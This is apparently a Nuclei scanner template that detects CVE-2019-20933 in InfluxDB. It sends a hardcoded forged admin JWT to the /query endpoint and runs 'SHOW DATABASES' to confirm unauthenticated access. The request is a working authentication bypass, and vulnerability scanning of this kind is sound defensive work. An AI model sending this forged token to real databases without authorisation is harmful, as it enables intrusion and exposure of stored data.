id: inflxdb-unauthorized-access

info:
    name: InflxDB Unauthorized Access
    author: Yuuki
    severity: high
    tags: unauth, database, influxdb, cve, cve-2019-20933

http:
    - method: POST

      path:
          - "{{BaseURL}}/query"

      headers:
          Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyNTM0MDIxODU2MDB9.Fu66RZDcUSawPpmtCpVDMr8kWjbTgmBa4I1kFzCLxM8
          Content-Type: application/x-www-form-urlencoded

      body: "q=SHOW DATABASES"

      matchers:
          - type: word
            words:
                - '"statement_id":0'
            part: body
